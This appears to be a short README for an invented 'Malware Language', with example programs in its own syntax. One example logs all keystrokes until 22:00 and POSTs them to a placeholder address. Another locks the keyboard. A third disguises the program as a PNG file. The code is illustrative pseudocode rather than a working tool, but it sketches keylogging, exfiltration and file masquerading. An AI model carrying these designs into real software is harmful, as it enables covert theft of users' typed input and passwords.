# Malware Language


### Example code
Basic example
```
use system; @ Imports exit
use keyboard; @ Imports lock, unlock
use window; @ Imports notify

main:{
 keyboard.lock(); @ Locks the keyboard 

 window.notify("Oh hi mark!"); @ Utilizes builtin function

 keyboard.unlock(); @ Unlocks the keyboard
 system.exit();
}
```

Network POST example
```
use system; @ Imports exit
use keyboard; @ Imports log
use network; @ Imports POST
use time; @ Imports until

main:{
 wait:(time.until("22:00")){ @ Waits until 22:00 today before exiting
  info := keyboard.log(); @ Logs everything the user enters
 }


 network.POST("address", "port", info); @ Will send whatever the user entered 

 system.exit(); @ Exits the program
}
```

Transform example
```
use system;
use object;
use window;

main:{
 object.set_header_target("png"); @ Will result in the end product being identified as a png
 object.set_extension(".png"); @ Sets the program extension
 
 window.notify("Hello, World!"); @ Prints "Hello, World!" to the screen

 system.exit(); @ Exits the program
}
```